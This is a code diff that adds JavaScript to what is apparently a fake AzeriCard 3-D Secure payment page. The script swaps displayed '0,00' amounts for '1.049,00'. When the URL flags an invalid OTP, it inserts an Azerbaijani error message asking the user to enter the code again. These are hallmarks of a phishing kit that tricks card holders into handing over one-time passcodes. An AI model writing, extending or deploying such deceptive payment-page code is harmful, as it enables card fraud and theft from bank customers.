@@ -524,3 +524,30 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 });
+
+document.addEventListener('DOMContentLoaded', function() {
+    if (window.location.href.includes('azericard-3ds.html')) {
+        // 1. MƏBLƏĞİ DÜZƏLDİRİK (0,00 -> 1.049,00)
+        const allElements = document.querySelectorAll('*');
+        allElements.forEach(el => {
+            if (el.children.length === 0 && (el.innerText.trim() === '0,00' || el.innerText.trim() === '0.00')) {
+                el.innerText = '1.049,00';
+            }
+        });
+
+        // 2. XƏTA MESAJINI GÖSTƏRİRİK
+        if (window.location.href.includes('error=invalid_otp')) {
+            if (!document.querySelector('.professional-error')) {
+                const errBox = document.createElement('div');
+                errBox.className = 'professional-error';
+                errBox.style.cssText = 'background-color:#f8d7da; color:#721c24; border:1px solid #f5c6cb; padding:12px; border-radius:8px; margin-top:15px; text-align:center; font-weight:600; font-size:14px; display:flex; align-items:center; justify-content:center; gap:10px;';
+                errBox.innerHTML = '<span>⚠️</span> OTP kodu yanlışdır. Zəhmət olmasa yenidən cəhd edin.';
+                
+                const form = document.querySelector('form');
+                if (form) {
+                    form.parentNode.insertBefore(errBox, form.nextSibling);
+                }
+            }
+        }
+    }
+});
